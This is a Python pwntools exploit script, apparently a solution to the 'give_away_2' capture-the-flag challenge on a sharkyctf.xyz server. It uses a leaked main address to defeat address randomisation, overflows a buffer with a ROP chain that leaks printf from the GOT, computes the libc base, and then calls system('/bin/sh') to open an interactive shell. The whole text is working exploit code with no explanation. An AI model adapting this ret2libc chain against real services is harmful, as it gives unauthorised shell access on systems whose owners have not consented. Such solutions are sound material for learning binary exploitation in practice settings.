from pwn import *
context.log_level = 'DEBUG'
#p=process("./give_away_2")
#elf=ELF("./give_away_2")
#libc=elf.libc
p=remote("sharkyctf.xyz",20335)
elf=ELF("/home/haojames/test/CTF/give_2/give_away_2")
libc=ELF("./libc.so")
pause()
p.recvuntil("Give away: ")
main = int(p.recvline(),16)
log.info("MAIN: "+hex(main))
base = main - elf.symbols['main']
log.info("BASE: "+hex(base))
elf.address = base
pop_rdi = base + 0x0000000000000903 

payload = 'A'*40
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(elf.got['printf'])
payload += p64(elf.plt['printf'])
payload += p64(elf.symbols['vuln'])
p.sendline(payload)
pause()

leak = u64(p.recv(6).strip('').ljust(8,'\x00'))
log.info("LEAK:"+hex(leak))
libc.address =leak - libc.symbols['printf']
log.info("LIBC:"+hex(libc.address))
system =libc.symbols['system']
log.info("SYSTEM: "+hex(system))
binsh =libc.search("/bin/sh\x00").next()
log.info("BINSH: "+hex(binsh))
#one_gadget = libc.address + 0xc83c0
payload = 'A'*40
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
p.sendline(payload)
p.interactive()